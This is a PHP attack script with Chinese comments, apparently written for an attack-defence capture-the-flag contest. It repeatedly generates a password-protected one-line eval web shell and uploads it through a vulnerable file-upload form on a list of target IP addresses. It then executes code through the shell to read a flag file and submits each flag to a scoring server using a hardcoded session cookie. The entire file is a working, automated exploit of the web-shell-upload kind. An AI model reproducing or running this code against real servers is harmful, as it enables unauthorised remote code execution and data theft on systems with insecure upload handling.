<?php
//忽略notice错误
error_reporting(0);
//写一句话文件函数
function write(){
	$password="wqr".substr(md5(rand(1,9999)),16);
	$myfile = fopen("D:\phpStudy\WWW\b.php", "w") or die("Unable to open file!");
	$txt = '<?php eval($_POST[\''.$password.'\']);?>';
	fwrite($myfile, $txt);
	fclose($myfile);
	return $password;	
}
//上传一句话文件函数
function upload($url){
	$post_data=array('uploaded'=>"@D:\phpStudy\WWW\b.php",'Upload'=>'1');
	$ch=curl_init();
 	curl_setopt($ch , CURLOPT_URL, $url);
 	curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch , CURLOPT_POST, 1);
	curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);
	curl_exec($ch);
	curl_close($ch);
}
//提取flag函数
function flag($url,$password){
	$post_data=$password.'='.urlencode('echo trim(file_get_contents(\'../../flag.php\'),\'<?php?>\');');
	$header=array('Content-Type'=>'Content-Type: application/x-www-form-urlencoded');
	$ch=curl_init();
	curl_setopt($ch , CURLOPT_URL , $url);
	curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch , CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_NOBODY, FALSE);
	curl_setopt($ch , CURLOPT_POST, 1);
	curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);
	$res=curl_exec($ch);
	$res=substr($res,4,38);
	return $res;
	curl_close($ch);

}
//提交flag函数
function submit($ip,$flag){
	$url="http://172.17.135.106/admin.php";
	$post_data=array('ip'=>"$ip",
					'flag'=>"$flag",
					'submit'=>'submit');
	$header=array('Content-Type'=>'Content-Type: application/x-www-form-urlencoded',
				'Cookie'=>'Cookie: PHPSESSID=vkabjekjd5agdjlde3ae1bhbu4');
	$ch=curl_init();
	curl_setopt($ch , CURLOPT_URL , $url);
	curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch , CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch , CURLOPT_POST, 1);
	curl_setopt($ch , CURLOPT_POSTFIELDS, http_build_query($post_data));
	$res=curl_exec($ch);
	return $res;
	curl_close($ch);
}
//将攻击机写入数组
$arr=array(
	'172.17.135.10',
	'172.17.135.12',
	'172.17.135.13',
	'172.17.135.14',
	'172.17.135.110');
$count=count($arr);
$arr2=array();
$arr3=array();
//不断进行提交flag操作
for ($i=0; ; $i++) { 
	//遍历数组，进行操作
	foreach ($arr as $value) {
		$password=write();
		upload($value);
		$url=$value.'/hackable/uploads/b.php';
		$flag=flag($url,$password);
		$res=submit($value,$flag);
		preg_match_all('/sussess/is', $res, $matches);
		if ($matches[0][0]=='sussess') {
			echo 'success!';
		}
		//将连接一句话的密码写进新定义的数组
		$arr2[]=$password;
		//将提取到的flag写进数组
		$arr3[]=$flag;		
	}
	var_dump($arr2);
	var_dump($arr3);
	sleep(120);
}


?>